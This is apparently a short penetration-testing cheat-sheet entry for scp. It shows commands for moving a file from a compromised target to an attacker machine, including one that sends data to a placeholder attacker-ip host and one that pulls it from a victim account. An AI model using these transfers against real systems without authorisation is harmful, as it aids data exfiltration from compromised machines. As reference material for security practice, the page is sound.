---
title: Scp
desc: It securely copy files and directories between two locations.
tags: [Linux, SSH]
alts: []
website:
render_with_liquid: false
---

## Transfer File from Target Machine to Attack Machine

```sh
# If you're on target machine
scp ./example.txt attacker@<attacker-ip>:/home/<username>/example.txt

# If your're on attack machine
scp victim-user@<target-ip>:./example.txt .
```